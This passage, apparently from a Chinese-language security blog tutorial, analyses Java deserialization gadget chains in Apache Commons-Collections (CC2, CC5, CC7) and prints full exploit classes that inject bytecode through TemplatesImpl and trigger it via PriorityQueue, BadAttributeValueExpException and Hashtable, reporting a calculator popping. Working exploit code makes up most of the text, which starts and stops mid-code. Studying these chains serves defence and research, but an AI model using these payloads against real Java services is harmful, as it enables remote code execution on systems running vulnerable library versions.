class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-comment">//其实这里可以不用这个，因为我们不再需要进入setValue方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformer.setAccessible(<span class="hljs-literal">true</span>);<br>        transformer.set(transformingComparator, chainedTransformer);<br><br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺利弹出计算器</p><p><img src="/img/CC4/c08.png"></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p><img src="/img/CC4/c09.png"></p><h1 id="CC2链"><a href="#CC2链" class="headerlink" title="CC2链"></a>CC2链</h1><h2 id="分析与EXP编写"><a href="#分析与EXP编写" class="headerlink" title="分析与EXP编写"></a>分析与EXP编写</h2><p>CC2 这条链实际上是在 CC4 链基础上的修改，目的是为了避免使用 <code>Transformer</code> 数组。</p><p>在 CC4 链的基础上，抛弃了用 <code>InstantiateTransformer</code> 类将 <code>TrAXFilter</code> 初始化，以及 <code>TemplatesImpl.newTransformer()</code> 这个步骤</p><p>看到了一个总结的很好的流程图，贴在这里</p><p><img src="/img/CC4/c10.png"></p><p>那么我们简单分析 CC2 链的前半部分，还是出现了 compare 这些，所以在 CC4 链中的 compare 部分是可用的。在 CC2 链最后部分是 TemplatesImpl 执行动态字节码，和 CC4 链最后的部分是相等的，我们可以直接搬进来。</p><p>还是老方法，先在transformingComparator对象中传入一个无用的东西，再通过反射修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>transformer.setAccessible(<span class="hljs-literal">true</span>);<br>transformer.set(transformingComparator, newTransformer);<br></code></pre></td></tr></table></figure><p>添加值</p><p>调试时可以看到这行代码传入的obj1会作为transform方法的执行对象</p><p>我们需要newTransformer对象调用transform方法来执行我们加载恶意字节码的操作，所以要传入我们构造好的templates对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(templates)<br></code></pre></td></tr></table></figure><p>最终EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        InvokerTransformer&lt;Object, Object&gt; newTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br><br>        <span class="hljs-comment">//反射修改值</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformer.setAccessible(<span class="hljs-literal">true</span>);<br>        transformer.set(transformingComparator, newTransformer);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><p><strong>Commons-Collections 版本限制</strong></p><ul><li>CC5 依赖的 <code>Transformer</code>、<code>ChainedTransformer</code>、<code>InvokerTransformer</code> 在 <strong>3.1 &#x2F; 3.2.1</strong> 中可用。</li><li>在 <strong>3.2.2+ 官方补丁</strong> 中，危险的 Transformer 被修补，导致利用链失效。<br> 👉 所以 CC5 仍然受 <strong>Commons-Collections 版本限制</strong>。(与CC3受限制原因相同)</li><li>在4.0版本中，LazyMap类的decorate方法被删除，无法利用此新建对象</li></ul><h2 id="分析调用链"><a href="#分析调用链" class="headerlink" title="分析调用链"></a>分析调用链</h2><p>cc5与cc3的不同只是触发调用LazyMap的get方法不同</p><p><img src="/img/CC4/c12.png"></p><p>这里依旧贴一个看到总结的很好的流程图</p><p><img src="/img/CC4/c11.png"></p><p>从 <code>BadAttributeValueExpException</code> 的 <code>readObject()</code> 方法进来</p><p>这里我们可以看到可以通过传参，使其调用TiedMapEntry的toString方法</p><p><img src="/img/CC4/c13.png"></p><p>进入到TiedMapEntry类可以看到它的toString方法调用了getValue方法，通过getValue方法可以调用LazyMap的get方法</p><p><img src="/img/CC4/c14.png"></p><h2 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//触发攻击链子</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//与CC1前半部分链子结合一下</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-comment">//实例化TiedMapEntry</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br>        tiedMapEntry.toString();<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br><br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>链子入口处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">      <span class="hljs-comment">//实例化TiedMapEntry</span><br>      <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br>      tiedMapEntry.toString();<br><br><span class="hljs-comment">//构造方法是public可以直接传参数</span><br>      <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br><br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>同样只是更改了触发调用LazyMap的get方法</p><p><img src="/img/CC4/c15.png"></p><ul><li>前半条链子的入口类是 <code>Hashtable</code>，我们跟进去看一下。</li></ul><p><code>Hashtable</code> 的入口类 <code>readObject()</code> 方法调用了一个 <code>reconstitutionPut()</code> 方法。</p><p><code>reconstitutionPut()</code> 方法中有<code>equals</code>方法的调用</p><p>找到了AbstractMapDecorator类的equals方法</p><p>这个类是继承了 map 接口，因为它是 CC 包里面的 Map 类，并且能够调用父类 Map，所以把它作为链子的一部分。但是 Map 是一个接口，我们需要去找 Map 的实现类</p><p><img src="/img/CC4/c17.png"></p><p>找到AbstractMap类的equals方法中会调用get方法，可以触发Lazy#get，与后半段链子连接起来</p><p>但是这个类不能序列化</p><p><img src="/img/CC4/c16.png"></p><h2 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h2><p>这里对传进的 Entry 对象数组进行了循环，逐个调用<code>e.key.equals(key)</code>，这里传进去的参数key如果是我们可控的，那么<code>AbstractMap.equals()</code>中的m就是我们可控的。</p><ul><li>从本质上来说，我们需要在入口类这里传进去恶意的 key，接着调用 key.equals() 即可。</li></ul><p>这一段传入恶意 key 应当如此</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>hashtable.put(lazyMap, <span class="hljs-string">&quot;value&quot;</span>);<br></code></pre></td></tr></table></figure><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.AbstractMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span 